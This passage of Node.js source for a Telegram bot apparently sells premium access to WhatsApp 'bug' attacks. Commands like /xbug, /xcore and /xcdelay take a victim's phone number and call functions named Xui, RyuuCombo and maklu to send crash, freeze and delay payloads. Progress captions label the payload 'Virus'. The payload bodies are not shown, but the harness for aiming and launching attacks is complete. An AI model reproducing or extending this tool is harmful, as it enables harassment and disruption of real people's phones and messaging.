  } else if (data === "mainmenu") {
    newCaption = `\`\`\`
─ Меня зовут ВИКОНТ ИНФИНИТИ. Я готов помочь в любое время и в любом месте. 

♰ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ♰
☃︎ Author : —͟͞Ryuichi
☃︎ Version : 3.0
☃︎ Bot Mode : ${mode}
☃︎ Language : nodeJS
☃︎ InterFace : Button Type
☃︎ Run Time : ${runtime}

©Ryuichi

——————————————
Sellect The Button Below
—–————————————
\`\`\``;
    newButtons = [
          [{ text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮", callback_data: "bugmenu" }],
          [
            { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫͡ 𝐌͢𝐞͡𝐧͜𝐮", callback_data: "ownermenu" },
            { text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤͡𝐬͜ 𝐭͢𝐨", callback_data: "thanksto" },
          ],
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫͡", url: "https://t.me/ryunidekk" }], 
    ];
  }
  bot
    .editMessageMedia(
      {
        type: "video",
        media: newImage,
        caption: newCaption,
        parse_mode: "Markdown",
      },
      { chat_id: chatId, message_id: messageId }
    )
    .then(() => {
      bot.editMessageReplyMarkup(
        { inline_keyboard: newButtons },
        { chat_id: chatId, message_id: messageId }
      );
    })
    .catch((err) => {
      console.error("Error editing message:", err);
    });
});

// ----------------------------------- ( Case Bug & Case Plugin ) -------------------------------- \\

bot.onText(/\/xbug (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
    );
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://f.uguu.se/FRqBPonK.jpg", {
      caption: `\`\`\`⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`⚠️ SENDER UNDEFINED \`\`\`
! Sender tidakk di temukannbtambahkan sender terlebih dahulu dengan cara /addsender 62xxx
`
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    bugRequests[chatId] = { stage: "awaitingNumber", jid };

    const bugMenu = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "OverLoad༑⃟", callback_data: `vx_FC:${jid}` },
            { text: "Supper Delay🩸", callback_data: `vx_FcDelay:${jid}` },
          ],
          [
            {
              text: "Xui Crash",
              callback_data: `vx_CrashSpam:${jid}`,
            },
            {
              text: "Attack ui",
              callback_data: `vx_DelayPhoto:${jid}`,
            },
          ],
          [
            { text: "Crash Ui", callback_data: `vx_CrashUI:${jid}` },
            { text: "Delay Mention", callback_data: `vx_DelayOnly:${jid}` },
          ],
          [
            {
              text: "꙳Xios༑",
              callback_data: `vxcrash_protoview:${jid}`,
            },
            { text: "Supper Crash༑", callback_data: `vxcrash_super:${jid}` },
          ],
        ],
      },
    };

    bot.sendPhoto(chatId, "https://f.uguu.se/FRqBPonK.jpg", {
      caption: `\`\`\`
┌────────────────────────┐
│ ⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ  ⚠️      
├────────────────────────┤
│! Pastikan nomor target benar 
│▢ Наша цель : ${formattedNumber}
└────────────────────────┘
\`\`\`
`,
      parse_mode: "Markdown",
      ...bugMenu,
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const [action, jid] = callbackQuery.data.split(":");

  if (action.startsWith("vx")) {
    try {
      if (sessions.size === 0) {
        return bot.sendMessage(
          chatId,
          "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
        );
      }

      const request = bugRequests[chatId];
      if (!request || !request.jid) {
        return bot.sendMessage(
          chatId,
          "❌ Tidak ditemukan data target. Silakan gunakan perintah /CSX-bug lagi."
        );
      }

      const formattedNumber = request.jid.replace("@s.whatsapp.net", "");

      await bot.editMessageCaption(
        `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━┓  
┃ ( 🍂 ) Proces sending bug
┣━━━━━━━━━━━━━━━━━━━━┫  
┃ Цель :  ${formattedNumber}
┃ Тип ошибки: Process...
┃ Статус : [░░░░░░░░░░] 0%
┗━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
        }
      );

      const progressStages = [
        { text: "[█░░░░░░░░░] 10%", delay: 200 },
        { text: "[███░░░░░░░] 30%", delay: 200 },
        { text: "[█████░░░░░] 50%", delay: 100 },
        { text: "[███████░░░] 70%", delay: 100 },
        { text: "[█████████░] 90%", delay: 100 },
        { text: "[██████████] 100%", delay: 200 },
      ];

      for (const stage of progressStages) {
        await new Promise((resolve) => setTimeout(resolve, stage.delay));
        await bot.editMessageCaption(
          `
\`\`\`
┏━━━━━━━━━━━━━━━━━━━━┓  
┃ ( 🍂 ) Proces sending bug
┣━━━━━━━━━━━━━━━━━━━━┫  
┃ Цель : ${formattedNumber}
┃ Тип ошибки: Sending....
┃ Статус : ${stage.text}
┗━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
          }
        );
      }

      let bugType;
      if (action === "vx_FC") {
        await Xui(jid);
        bugType = "Super Ui";
      } else if (action === "vx_FcDelay") {
        await RyuuCombo(jid);
        await RyuuUi(jid);
        bugType = "Mention Trash";
      } else if (action === "vx_CrashSpam") {
        await Xui(jid);
        await RyuuCombo(jid);
        bugType = "Burtal Delay";
      } else if (action === "vx_DelayPhoto") {
        await DelayBrutal(23, jid);
        bugType = "DelayUi";
      } else if (action === "vx_CrashUI") {
        await RyuuCombo(jid);
        await Xui(jid);
        bugType = "Ui NotRespon";
      } else if (action === "vx_DelayOnly") {
        await maklu(33, jid);
        bugType = "Crash Flood";
      } else if (action === "vxcrash_protoview") {
        await RyuuUi(jid);
        bugType = "Supper Ui༑";
      } else if (action === "vxcrash_super") {
        await Xui(jid);
        bugType = "Xios";
      } else {
        return bot.sendMessage(chatId, "❌ Unknown action.");
      }
    } catch (error) {
      bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
    }
  }
});

bot.onText(/\/xcore (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/y695jp.jpg", {
      caption: `\`\`\`⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`⚠️ SENDER UNDEFINED \`\`\`
! Sender tidakk di temukannbtambahkan sender terlebih dahulu dengan cara /addsender 62xxx
`
      );
    }
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://h.uguu.se/DQnUzfOP.jpg",
      {
        caption: `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Process...
 𖥂 Status : [░░░░░░░░░░] 0%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        parse_mode: "Markdown",
      }
    );
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 100 },
      { text: "[███████░░░] 70%", delay: 100 },
      { text: "[█████████░] 90%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 },
    ];
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProces Sending Bug 」
 𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 :wa.me/${formattedNumber}
 𖥂 Virus : X
 𖥂 Status : ${stage.text}
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await RyuTrick(24, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Succes
 𖥂 Status : [██████████] 100%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,

      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/combox (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/y695jp.jpg", {
      caption: `\`\`\`⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`⚠️ SENDER UNDEFINED \`\`\`
! Sender tidakk di temukannbtambahkan sender terlebih dahulu dengan cara /addsender 62xxx
`
      );
    }
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://n.uguu.se/sWcnyrbq.jpg",
      {
        caption: `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Process...
 𖥂 Status : [░░░░░░░░░░] 0%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        parse_mode: "Markdown",
      }
    );
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 100 },
      { text: "[███████░░░] 70%", delay: 100 },
      { text: "[█████████░] 90%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 },
    ];
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProces Sending Bug 」
 𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 :wa.me/${formattedNumber}
 𖥂 Virus : X
 𖥂 Status : ${stage.text}
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await maklu(100, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Succes
 𖥂 Status : [██████████] 100%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,

      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/hardinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/y695jp.jpg", {
      caption: `\`\`\`⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        `\`\`\`⚠️ SENDER UNDEFINED \`\`\`
! Sender tidakk di temukannbtambahkan sender terlebih dahulu dengan cara /addsender 62xxx
`
      );
    }
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://f.uguu.se/FRqBPonK.jpg",
      {
        caption: `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Process...
 𖥂 Status : [░░░░░░░░░░] 0%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        parse_mode: "Markdown",
      }
    );
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 100 },
      { text: "[███████░░░] 70%", delay: 100 },
      { text: "[█████████░] 90%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 },
    ];
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProces Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Virus : X
 𖥂 Status : ${stage.text}
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await RyuuX(40, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Succes
 𖥂 Status : [██████████] 100%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,

      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xcdelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/y695jp.jpg", {
      caption: `\`\`\`⚠️ ВЫ НЕ ПОЛЬЗОВАТЕЛЬ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(
      chatId,
      `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        `⚠️ SENDER UNDEFINED 
! Sender tidakk di temukannbtambahkan sender terlebih dahulu dengan cara /addsender 62xxx
`
      );
    }
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://h.uguu.se/DQnUzfOP.jpg",
      {
        caption: `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Process...
 𖥂 Status : [░░░░░░░░░░] 0%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        parse_mode: "Markdown",
      }
    );
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 100 },
      { text: "[███████░░░] 70%", delay: 100 },
      { text: "[█████████░] 90%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 },
    ];
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProces Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Virus : X
 𖥂 Status : ${stage.text}
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await RyuuX(99, jid);
    await maklu(99, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `\`\`\`
┣━━━━━━━━━━━━━━━━━━━━┫  
  「 <🝰 ᯭProcess Sending Bug 」
 𖥂 Target :wa.me/${formattedNumber}
 𖥂 Sending : Succes
 𖥂 Status : [██████████] 100%
┣━━━━━━━━━━━━━━━━━━━━┫  
\`\`\``,

      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//---------------------------- ( Case Plug-ins ) ------------------------------------\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      ` 
 ┣━━━━━━━━━━━━━━━━━━━━┫  
    ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
  Anda tidak memliki izin untuk ini
 ┣━━━━━━━━━━━━━━━━━━━━┫  
`,
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/gruponly (on|off)/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
┣━━━━━━━━━━━━━━━━━━━━┫  

`
    );
  }
  const mode = match[1].toLowerCase();
  const status = mode === "on";
  setGroupOnly(status);

  bot.sendMessage(
    msg.chat.id,
    `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`,
    {
      parse_mode: "Markdown",
    }
  );
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

const moment = require("moment");
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ )
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
 `
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
    ( ❌ ) Comand Salah ( ❌)
    /addprem 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌)
    /addprem 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      `
 ┣━━━━━━━━━━━━━━━━━━━━┫  
    ( ❌ ) Comand Salah ( ❌)
     /addprem 6843967527 30d
 ┣━━━━━━━━━━━━━━━━━━━━┫  
  `
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌)
    /addprem 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
   ( ✅ ) SUCCES ADD USER  
User ${userId} ${expirationDate.format("YYYY-MM-DD HH:mm:ss")}.
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  `
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```";
  message += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
  message += "┃ ( + )  LIST PREMIUM USERS\n";
  message += "┣━━━━━━━━━━━━━━━━━━━━━━━┫\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `┃${index + 1}. ID: ${user.id}\n┃   Exp: ${expiresAt}\n`;
  });
  message += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ )
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1])
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌)
   /addadmin 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌) 
   /addadmin 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
  ( ✅ ) SUCCES ADD USER 
User ${userId} added as an admin.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ )
  Anda tidak memliki izin untuk ini.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ❌ ) Comand Salah ( ❌)
    /delprem 6843967527 30d.
┣━━━━━━━━━━━━━━━━━━━━┫  
`
    );
  }
  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `
┣━━━━━━━━━━━━━━━━━━━━┫  
  ( ✅ ) SUCCES DELL USER 
User ${userId} has been removed
┣━━━━━━━━━━━━━━━━━━━━┫  
`
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `
┣━━━━━━━━━━━━━━━━━━━━┫  
